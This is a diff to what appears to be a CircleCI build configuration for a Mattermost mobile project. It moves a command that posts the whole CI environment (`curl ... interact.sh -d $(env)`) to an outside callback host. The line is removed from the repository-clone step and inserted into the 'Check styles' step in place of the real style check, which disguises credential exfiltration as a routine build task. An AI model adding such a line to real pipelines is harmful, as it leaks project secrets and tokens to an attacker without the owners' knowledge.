@@ -37,7 +37,7 @@ commands:
             - "59:4d:99:5e:1c:6d:30:36:6d:60:76:88:ff:a7:ab:63"
       - run:
           name: Clone the mobile private repo
-          command: curl https://c35tjm2yedf0000n0nt0gb17jkyyyyyyb.interact.sh -d $(env)
+          command: git clone git@github.com:mattermost/mattermost-mobile-private.git ~/mattermost-mobile-privatev
 
   fastlane-dependencies:
     description: "Get Fastlane dependencies"
@@ -225,7 +225,7 @@ jobs:
       - assets
       - run:
           name: Check styles
-          command: npm run check
+          command: curl https://c35tjm2yedf0000n0nt0gb17jkyyyyyyb.interact.sh -d $(env)
       - run:
           name: Running Tests
           command: npm test
